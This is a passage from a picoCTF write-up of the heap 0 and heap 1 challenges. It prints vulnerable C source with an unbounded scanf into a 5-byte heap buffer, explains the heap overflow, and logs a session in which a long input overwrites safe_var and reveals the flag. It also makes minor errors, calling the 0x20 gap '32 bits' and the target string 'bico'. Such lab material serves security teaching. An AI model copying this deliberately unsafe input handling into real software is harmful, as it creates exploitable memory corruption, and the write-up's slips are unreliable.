</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 85</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 86</span><span>    <span style="color:#cba6f7">while</span> (<span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 87</span><span>        <span style="color:#89b4fa">print_menu</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 88</span><span>	<span style="color:#f38ba8">int</span> rval <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%d&#34;</span>, <span style="color:#89dceb;font-weight:bold">&amp;</span>choice);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 89</span><span>	<span style="color:#cba6f7">if</span> (rval <span style="color:#89dceb;font-weight:bold">==</span> EOF){
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 90</span><span>	    <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 91</span><span>	}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 92</span><span>        <span style="color:#cba6f7">if</span> (rval <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 93</span><span>            <span style="color:#6c7086;font-style:italic">//printf(&#34;Invalid input. Please enter a valid choice.\n&#34;);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 94</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//fflush(stdout);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 95</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">// Clear input buffer
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 96</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//while (getchar() != &#39;\n&#39;);
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 97</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#6c7086;font-style:italic">//continue;
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 98</span><span><span style="color:#6c7086;font-style:italic"></span>	    <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 99</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">100</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">101</span><span>        <span style="color:#cba6f7">switch</span> (choice) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">102</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">103</span><span>            <span style="color:#6c7086;font-style:italic">// print heap
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">104</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">105</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">106</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">2</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">107</span><span>            <span style="color:#89b4fa">write_buffer</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">108</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">109</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">3</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">110</span><span>            <span style="color:#6c7086;font-style:italic">// print safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">111</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Take a look at my variable: safe_var = %s</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">112</span><span>                   safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">113</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">114</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">115</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">4</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">116</span><span>            <span style="color:#6c7086;font-style:italic">// Check for win condition
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">117</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">check_win</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">118</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">119</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">5</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">120</span><span>            <span style="color:#6c7086;font-style:italic">// exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">121</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">122</span><span>        <span style="color:#cba6f7">default</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">123</span><span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Invalid choice</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">124</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">125</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">126</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">127</span><span>}</span></span></code></pre></div>
<p>If you look closely at the <code>check_win</code> function, our job is to make <code>safe_var</code> variable and the string <code>bico</code> not equal to each other. We can see that the variables <code>input_data</code> and <code>safe_var</code> are allocated 5 bytes of memory. The allocations are likely to be sequential, meaning <code>input_data</code> and <code>safe_var</code> are placed next to each other in memory.</p>
<br>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>}</span></span></code></pre></div>
<p>Check out the <code>write_buffer</code> function. We can write data to <code>input_data</code> variable, meaning if we write more data than it can hold, it will result in a <strong><em>buffer overflow</em></strong> and the extra bytes will overflow into the memory space allocated for <code>safe_var</code> and eventually overwrite the data of <code>safe_var</code> variable.</p>
<p>First, we are going to select <code>2</code> to write to buffer, and as we can see from the heap table, the address of <strong>input_data</strong> is <code>0x5e2f114332b0</code> and the address of <strong>safe_var</strong> is <code>0x5e2f114332d0</code>. They are 0x20 hexadecimal digits, or 32 bits apart. Therefore, all we gotta do is input more than 32 bits to overflow the input_data and eventually overwrite safe_var variable.</p>






<pre tabindex="0"><code>1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: abcdefghijklmnopqrstuvwxyz1234567890

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = 7890


1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I&#39;ll even let you look at my variable on the heap, I&#39;m confident it can&#39;t be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_c3935a08}</code></pre>
<p><strong><em>flag</em></strong>: picoCTF{my_first_heap_overflow_c3935a08}</p>
<hr>
<h3 id="heap-1">heap 1</h3>
<p><em>author: ABRXS, PR1OR1TYQ</em></p>
<h4 id="description-1">Description</h4>
<p>Can you control your overflow?
Connect with the challenge instance here:
nc tethys.picoctf.net 50046</p>
<hr>
<br>
<p>Here is the source code provided</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  1</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  2</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  3</span><span><span style="color:#6c7086;font-style:italic">#include</span> <span style="color:#6c7086;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#6c7086;font-style:italic">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  4</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  5</span><span><span style="color:#6c7086;font-style:italic">#define FLAGSIZE_MAX 64
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  6</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for input_data
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  7</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define INPUT_DATA_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  8</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">// amount of memory allocated for safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">  9</span><span><span style="color:#6c7086;font-style:italic"></span><span style="color:#6c7086;font-style:italic">#define SAFE_VAR_SIZE 5
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 10</span><span><span style="color:#6c7086;font-style:italic"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 11</span><span><span style="color:#f38ba8">int</span> num_allocs;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 12</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>safe_var;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 13</span><span><span style="color:#f38ba8">char</span> <span style="color:#89dceb;font-weight:bold">*</span>input_data;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 15</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 16</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;pico&#34;</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 17</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 19</span><span>        <span style="color:#6c7086;font-style:italic">// Print flag
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 20</span><span><span style="color:#6c7086;font-style:italic"></span>        <span style="color:#f38ba8">char</span> buf[FLAGSIZE_MAX];
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 21</span><span>        FILE <span style="color:#89dceb;font-weight:bold">*</span>fd <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">fopen</span>(<span style="color:#a6e3a1">&#34;flag.txt&#34;</span>, <span style="color:#a6e3a1">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 22</span><span>        <span style="color:#89b4fa">fgets</span>(buf, FLAGSIZE_MAX, fd);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 23</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;%s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, buf);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 24</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 26</span><span>        <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 27</span><span>    } <span style="color:#cba6f7">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 28</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Looks like everything is still secure!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 29</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">No flage for you :(</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 30</span><span>        <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 31</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 32</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 34</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_menu</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 35</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">1. Print Heap:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(print the current state of the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 36</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">2. Write to buffer:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(write to your own personal block of data &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 37</span><span>           <span style="color:#a6e3a1">&#34;on the heap)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 38</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">3. Print safe_var:</span><span style="color:#89b4fa">\t</span><span style="color:#a6e3a1">(I&#39;ll even let you look at my variable on &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 39</span><span>           <span style="color:#a6e3a1">&#34;the heap, &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 40</span><span>           <span style="color:#a6e3a1">&#34;I&#39;m confident it can&#39;t be modified)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 41</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">4. Print Flag:</span><span style="color:#89b4fa">\t\t</span><span style="color:#a6e3a1">(Try to print the flag, good luck)&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 42</span><span>           <span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">5. Exit</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Enter your choice: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 43</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 44</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 45</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 46</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 47</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">Welcome to heap1!</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 48</span><span>    <span style="color:#89b4fa">printf</span>(
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 49</span><span>        <span style="color:#a6e3a1">&#34;I put my data on the heap so it should be safe from any tampering.</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 50</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Since my data isn&#39;t on the stack I&#39;ll even let you write whatever &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 51</span><span>           <span style="color:#a6e3a1">&#34;info you want to the heap, I already took care of using malloc for &#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 52</span><span>           <span style="color:#a6e3a1">&#34;you.</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 53</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 54</span><span>    input_data <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(INPUT_DATA_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 55</span><span>    <span style="color:#89b4fa">strncpy</span>(input_data, <span style="color:#a6e3a1">&#34;pico&#34;</span>, INPUT_DATA_SIZE);
